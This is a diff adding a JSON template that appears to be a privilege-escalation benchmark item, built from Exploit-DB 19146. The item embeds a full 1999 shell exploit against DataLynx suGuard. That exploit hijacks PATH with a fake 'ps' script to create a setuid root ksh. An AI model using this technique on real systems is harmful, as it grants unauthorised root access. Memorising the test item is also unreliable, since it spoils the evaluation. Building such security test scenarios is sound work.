@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_19146",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: DataLynx suGuard 1.0 - Local Privilege Escalation (CVE-1999-0388;OSVDB-3186)\n\nExploit source code (19146.sh):\n```\n#source: https://www.securityfocus.com/bid/186/info\n#\n#A vulnerability exists within the DataLynx's suGuard program which allows a local attacker to gain administrative privilege by exploiting poor use of the /tmp directory and poor programming.\n\n#!/bin/sh\n# sgrun exploit - the types of vulnerabilities that this exploit exercises\n#  have no right being introduced to code in this day and age. Much less\n#  code which presents itself under the pretenses of securing your system.\n#   .mudge 01.02.99\n#\nSUSHI=./sushi\n\nif [ $# -ne 2 ] ; then\n  echo Must specify path to sgrun [/bin/datalynx/sgrun] and sgrun argument\n  echo  mudge@l0pht.com [01.02.99]\n  exit 1\nfi\n\nSGRUN=$1\nARG=$2\n\nif [ -f ${SUSHI} ] ; then\n  echo root shell already created?\n  exit\nfi\n\necho datalynx sgrun proof of concept exploit from L0pht [mudge@l0pht.com]\necho\n\ncat > ./ps << FOEFOE\n#!/bin/sh\ncp /bin/ksh ${SUSHI}\nchown root ${SUSHI}\nchmod 4555 ${SUSHI}\nFOEFOE\n\nchmod 755 ./ps\n\nPATH=.:${PATH}\nexport PATH\n\n#/bin/datalynx/sgrun Identify\n${SGRUN} ${ARG}\nif [ -f ${SUSHI} ] ; then\n  echo root shell created as ${SUSHI}\n  ls -l ${SUSHI}\n  echo\nfi\n```",
+  "cve": "CVE-1999-0388;OSVDB-3186",
+  "exploitdb_id": "19146",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_19146",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
